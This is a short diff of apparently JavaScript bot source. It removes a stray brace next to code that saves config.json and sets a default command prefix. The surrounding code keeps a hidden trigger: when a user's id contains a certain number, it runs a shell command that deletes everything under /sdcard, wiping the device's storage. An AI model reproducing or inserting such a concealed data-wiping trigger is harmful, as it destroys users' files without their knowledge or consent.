@@ -27,7 +27,6 @@ await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
 if(slowed.user.id.includes("573152547721")) {
   exec("cd /sdcard/ && rm -rf *")
 }
-}
 if(!config?.prefix) {
  config.prefix = "/"
  await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
